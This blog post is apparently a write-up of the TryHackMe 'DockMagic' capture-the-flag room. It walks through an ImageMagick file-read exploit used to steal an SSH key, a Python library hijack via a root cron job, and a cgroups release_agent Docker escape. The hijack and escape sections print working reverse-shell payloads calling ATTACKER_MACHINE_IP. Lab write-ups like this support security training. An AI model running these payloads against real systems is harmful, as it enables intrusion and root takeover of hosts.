---
layout: posts
title: "DockMagic CTF Writeup"
date: 2026-01-08
categories: writeups
tags: Linux Boot2Root Web PrivEsc Docker ImageMagick
exerpt: In a land of magic, a wizard escaped from his confinement and embarks on a new adventure.
difficulty: Medium
---


# TryHackMe: DockMagic Writeup

**Difficulty:** {{page.difficulty}} | **Focus:** {{ page.tags | join: ', ' }}.

> **Room link:** [https://tryhackme.com/room/dockmagic](https://tryhackme.com/room/dockmagic)

Hey everyone! Today we're breaking into **DockMagic**. This box is a wild ride that starts with a sneaky image vulnerability, moves into some Python environment abuse, and finishes with a full-on breakout from a Docker container.

---

## 1. Scouting & Subdomain Hunting (Flag 1)

I started with a quick `nmap` scan to see what doors were open.
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
Only two ports? Pretty standard. Visiting the site on port 80 pointed me toward `site.empman.thm`, so I updated my hosts file:
```echo '10.49.187.183 site.empman.thm' >> /etc/hosts```

The site lets you create an account and login. I tried poking at the image upload feature, thinking maybe I could get a reverse shell through a file upload vulnerability, but the filters were too strong. 

Since "empman.thm" seemed like a parent domain, I figured there might be subdomains hiding in the shadows. I fired up `gobuster` for some vhost enumeration:

```gobuster vhost -w /root/Desktop/Tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://empman.thm --append-domain```

**Found it:** `backup.empman.thm`. 

Inside that backup subdomain, I found a `ImageMagick.zip` file. The `README.txt` inside confirmed it was **version 7**. This was the "Aha!" moment—I bet the main site is using this exact version to process the profile pictures I tried to upload earlier.

---

## 2. Exploiting ImageMagick (Entry Point)

Knowing the version, I searched for vulnerabilities and found **CVE-2022-44268**, an Arbitrary File Read vulnerability.



Basically, you can craft a malicious PNG that, when processed by ImageMagick, embeds the contents of a file from the server into the resulting image. I followed this guide on Exploit-DB to craft my payload:
> **Reference:** [https://www.exploit-db.com/exploits/51261](https://www.exploit-db.com/exploits/51261)

I used the exploit to "read" `/etc/passwd`. It worked! I saw a user named **emp**. Next logical step? Try to grab their SSH private key:
1. I crafted a PNG to read `/home/emp/.ssh/id_rsa`.
2. Uploaded it to the site.
3. Downloaded the processed image and extracted the hex data.
4. Converted the hex back to text, and boom—I had **emp's private key**.

I saved the key, fixed the permissions (`chmod 600`), and SSH'd right in. **Flag 1 secured!**

---

## 3. Python Library Hijacking (Flag 2)

Now that I was in as `emp`, I needed to get to Root. I checked the system's cron jobs:

```cat /etc/crontab```

I found this interesting line:

```* * * * * root PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py```

This is a massive misconfiguration. The `PYTHONPATH` is being set to `/dev/shm` (a world-writable directory) *before* the system folders. This is a textbook **Python Library Hijacking** scenario.



I checked the contents of `/usr/local/sbin/backup.py`:
```
import cbackup
import time
cbackup.init('/home/emp/app')
```

It imports a module called `cbackup`. Since I can write to `/dev/shm`, I can just create my own `cbackup.py` there with a reverse shell payload. When the cron job runs every minute, it will look in `/dev/shm`, find my malicious script, and run it as **root**.

I created `/dev/shm/cbackup.py`:
```
import socket, os, subprocess
def init(path):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("ATTACKER_MACHINE_IP", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])
```
I caught the shell on my listener and grabbed **Flag 2**.

---

## 4. Cgroups Release_Agent Docker Escape (Flag 3)

Even though I was "root," I couldn't find the third flag anywhere. I tried searching high and low:

```find / -type f -name "flag3.txt" 2>/dev/null```

Nothing. Then it hit me: the challenge is called **DockMagic**. Am I in a container?

I checked `/proc/1/cgroup` and saw "docker" everywhere. Yep, I was trapped in a Docker container. I needed to escape to the host machine. I used a tool called **Deepce** to check for escape vectors:
> **Reference:** [https://github.com/stealthcopter/deepce.git](https://github.com/stealthcopter/deepce.git)

It confirmed I was in a privileged-ish container. I found a brilliant blog post about escaping via **cgroups release_agent**:
> **Reference:** [https://medium.com/@indigoshadowwashere/docker-container-escape-by-exploiting-cgroups-e52efab898d3](https://medium.com/@indigoshadowwashere/docker-container-escape-by-exploiting-cgroups-e52efab898d3)

I'll admit, I felt like a bit of a script kiddy copy-pasting this, but hey, if it works, it works! T-T. Here’s the exploit script I used to trigger a reverse shell on the **host machine**:

```
#!/bin/bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo '/bin/bash -i >& /dev/tcp/ATTACKER_MACHINE_IP/4445 0>&1' >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

I executed it, and my second listener lit up. I was finally on the host machine as `vagrant`. I found **flag3.txt** in the home directory. 

**Game over!**
